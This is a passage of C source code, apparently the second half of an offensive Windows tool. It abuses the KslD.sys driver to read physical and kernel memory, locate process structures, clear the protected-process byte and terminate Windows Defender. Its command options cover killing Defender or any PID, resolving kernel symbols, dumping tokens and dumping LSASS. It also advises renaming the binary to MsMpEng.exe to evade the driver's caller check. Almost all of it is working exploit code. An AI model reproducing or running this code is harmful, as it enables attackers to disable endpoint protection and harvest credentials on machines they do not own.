            printf("[*] KslD.sys (this build) may only support READ primitives.\n");
            printf("[*] Physical memory WRITE requires:\n");
            printf("    - MMIO write (sub-cmd 0x13) needs Intel SATA at PCI 0:31.0\n");
            printf("    - Or use a different driver with write capability\n\n");
            printf("[*] Exploit data for manual PPL bypass:\n");
            printf("    EPROCESS physical addr : 0x%llx\n", defenderEprocessPhys);
            printf("    Protection physical    : 0x%llx\n", protPhys);
            printf("    Protection value       : 0x%02x\n", defenderProtection);
            printf("    Defender PID           : %lu\n", defenderPid);
            if (systemToken) {
                printf("    SYSTEM Token           : 0x%llx\n", systemToken);
                printf("    SYSTEM Token physical  : 0x%llx\n", systemTokenPhys);
            }
            printf("\n[*] To complete the kill, use any driver with physical memory WRITE\n");
            printf("[*] to write 0x00 to physical address 0x%llx\n", protPhys);
            CloseHandle(hDevice);
            return 1;
        }

        printf("\n[*] Verifying write...\n");
        Sleep(100);
        BYTE verifyBuf[0x1000] = {0};
        DWORD vRead = 0;
        ULONGLONG verifyPage = protPhys & ~0xFFFULL;
        ULONG verifyOff = (ULONG)(protPhys & 0xFFF);
        if (ReadPhysicalMemory(verifyPage, verifyBuf, 0x1000, &vRead) && vRead >= verifyOff + 1) {
            BYTE newProt = verifyBuf[verifyOff];
            printf("[*] Protection byte after write: 0x%02x\n", newProt);
            if (newProt == 0x00) {
                printf("[+] PPL CLEARED SUCCESSFULLY!\n\n");
            } else {
                printf("[-] Protection byte unchanged. Write may not have worked.\n");
                CloseHandle(hDevice);
                return 1;
            }
        }
    }

    printf("[Step 7] Re-attempting termination after PPL bypass...\n");
    Sleep(200);

    hDefender = OpenProcess(PROCESS_TERMINATE, FALSE, defenderPid);
    if (hDefender) {
        if (TerminateProcess(hDefender, 1)) {
            printf("[+] ================================================\n");
            printf("[+]   WINDOWS DEFENDER KILLED!\n");
            printf("[+]   MsMpEng.exe (PID %lu) terminated successfully\n", defenderPid);
            printf("[+]   PPL bypass via KslD.sys physical memory write\n");
            printf("[+] ================================================\n");
        } else {
            printf("[-] TerminateProcess still failed: %lu\n", GetLastError());
            printf("[*] Protection byte may need different offset for this build.\n");
        }
        CloseHandle(hDefender);
    } else {
        printf("[-] OpenProcess still denied: %lu\n", GetLastError());
        printf("[*] PPL clear may not have taken effect yet.\n");
    }

    CloseHandle(hDevice);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        PrintUsage();
        return 1;
    }

    EnablePrivilege("SeDebugPrivilege");

    char exeName[MAX_PATH];
    GetModuleFileNameA(NULL, exeName, MAX_PATH);
    char* slash = strrchr(exeName, '\\');
    if (slash) slash++; else slash = exeName;
    if (_stricmp(slash, "MsMpEng.exe") != 0) {
        printf("[!] WARNING: Executable is named '%s', not 'MsMpEng.exe'.\n", slash);
        printf("[!] KslD checks caller process name. Rename to MsMpEng.exe for bypass.\n\n");
    }

    if (strcmp(argv[1], "--check") == 0) {
        return DoCheck();
    }
    else if (strcmp(argv[1], "--kaslr") == 0) {
        return DoFullKaslr();
    }
    else if (strcmp(argv[1], "--dump-regs") == 0) {
        return DoDumpRegs();
    }
    else if (strcmp(argv[1], "--init-mmio") == 0) {
        return DoInitMmio();
    }
    else if (strcmp(argv[1], "--dump-0x12") == 0) {
        return DoDump0x12();
    }
    else if (strcmp(argv[1], "--read") == 0 && argc >= 4) {
        ULONGLONG addr = strtoull(argv[2], NULL, 16);
        ULONG size = strtoul(argv[3], NULL, 0);
        if (size == 0) size = 256;
        if (size > 0x100000) { printf("[-] Max read size: 1MB\n"); return 1; }
        return DoReadPhys(addr, size);
    }
    else if (strcmp(argv[1], "--read-mmio") == 0 && argc >= 3) {
        ULONGLONG addr = strtoull(argv[2], NULL, 16);
        return DoReadPhys(addr, 0x1000);
    }
    else if (strcmp(argv[1], "--scan-kernel") == 0) {
        return DoScanKernel();
    }
    else if (strcmp(argv[1], "--find-eprocess") == 0) {
        return DoFindEprocess();
    }
    else if (strcmp(argv[1], "--dump-tokens") == 0) {
        return DoDumpTokens();
    }
    else if (strcmp(argv[1], "--kill-defender") == 0) {
        return DoKillDefender();
    }
    else if (strcmp(argv[1], "--diagnose") == 0) {
        return DoDiagnosePhysRead();
    }
    else if (strcmp(argv[1], "--raw-eprocess") == 0) {
        if (!OpenDevice()) return 1;
        UINT64 pPSIP = ResolveSymbol("PsInitialSystemProcess");
        UINT64 sysEP = 0;
        KslMmCopyRead(pPSIP, &sysEP, 8);
        printf("[+] System EPROCESS: 0x%016llX\n\n", sysEP);
        DumpRawEprocess(sysEP);
        CloseHandle(hDevice);
        return 0;
    }
    else if (strcmp(argv[1], "--ppl-kill") == 0) {
        return DoPplKill();
    }
    else if (strcmp(argv[1], "--kill") == 0 && argc >= 3) {
        DWORD targetPid = (DWORD)strtoul(argv[2], NULL, 10);
        printf("=== KslD.sys PPL Kill — Target PID %lu ===\n\n", targetPid);
        if (!OpenDevice()) return 1;
        EnablePrivilege("SeDebugPrivilege");

        printf("[*] Resolving symbols...\n");
        UINT64 pPSIP = ResolveSymbol("PsInitialSystemProcess");
        printf("[+] PsInitialSystemProcess = 0x%016llX\n", pPSIP);

        printf("[*] Getting EPROCESS for PID %lu...\n", targetPid);
        UINT64 targetEprocess = GetEprocessViaHandleTable(targetPid);
        if (!targetEprocess) {
            printf("[-] Cannot find EPROCESS for PID %lu\n", targetPid);
            CloseHandle(hDevice);
            return 1;
        }
        printf("[+] EPROCESS = 0x%016llX\n", targetEprocess);

        BYTE prot = 0;
        KslMmCopyRead(targetEprocess + EPROCESS_PROTECTION, &prot, 1);
        char imgName[16] = {0};
        KslMmCopyRead(targetEprocess + EPROCESS_IMAGEFILENAME, imgName, 15);
        printf("[+] ImageFileName: %s\n", imgName);
        printf("[+] Protection: 0x%02X\n", prot);

        if (prot == 0) {
            printf("[*] Not PPL-protected. Trying direct kill...\n");
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, targetPid);
            if (h) { TerminateProcess(h, 1); CloseHandle(h); printf("[+] Killed.\n"); }
            else printf("[-] OpenProcess failed: %lu\n", GetLastError());
            CloseHandle(hDevice);
            return 0;
        }

        printf("[-] PPL active (0x%02X). No write primitive available to clear protection.\n", prot);
        printf("[-] KslD.sys provides read-only access. PPL kill requires a separate write driver.\n");
        CloseHandle(hDevice);
        return 0;
    }
    else if (strcmp(argv[1], "--resolve") == 0) {

        if (!OpenDevice()) return 1;

        const char* funcNames[] = {
            "PsInitialSystemProcess",
            "PsActiveProcessHead",
            "NtOpenProcess",
            "MmCopyVirtualMemory",
            "PsLookupProcessByProcessId",
            "ZwTerminateProcess",
            "PsGetProcessProtection",
            "SePrivilegeCheck",
            "IoDriverObjectType",
            NULL
        };

        printf("=== KslD Sub-cmd 0x07: Kernel Symbol Resolution ===\n\n");
        printf("[*] Using MmGetSystemRoutineAddress to resolve kernel symbols.\n\n");

        BOOL anyWorked = FALSE;

        for (int f = 0; funcNames[f]; f++) {
            WCHAR wname[256] = {0};
            MultiByteToWideChar(CP_ACP, 0, funcNames[f], -1, wname, 256);
            DWORD wcharCount = (DWORD)wcslen(wname);
            DWORD stringByteLen = (wcharCount + 1) * sizeof(WCHAR);

            DWORD inputSize = 0x0C + stringByteLen;
            BYTE inBuf[600] = {0};
            *(DWORD*)(inBuf + 0x00) = 0x07;
            *(DWORD*)(inBuf + 0x04) = stringByteLen;
            *(DWORD*)(inBuf + 0x08) = 0x0C;
            memcpy(inBuf + 0x0C, wname, stringByteLen);

            BYTE outBuf[16] = {0};
            DWORD br = 0;
            BOOL ok = DeviceIoControl(hDevice, KSLD_IOCTL,
                inBuf, inputSize, outBuf, sizeof(outBuf), &br, NULL);
            DWORD err = GetLastError();

            if (ok && br >= 8) {
                UINT64 addr = *(UINT64*)outBuf;
                printf("[+] %-30s = 0x%016llX\n", funcNames[f], addr);
                anyWorked = TRUE;
            } else {
                printf("[-] %-30s FAILED (ok=%d, err=%lu, br=%lu)\n",
                       funcNames[f], ok, err, br);
            }
        }

        if (anyWorked) {
            printf("\n[+] Kernel symbol resolution operational.\n");
        } else {
            printf("\n[-] Sub-cmd 0x07 not functional on this build.\n");
        }

        CloseHandle(hDevice);
        return 0;
    }
    else if (strcmp(argv[1], "--lsass-dump") == 0) {
        return DoLsassDump();
    }
    else if (strcmp(argv[1], "--help") == 0) {
        PrintUsage();
        return 0;
    }
    else {
        PrintUsage();
        return 1;
    }
}
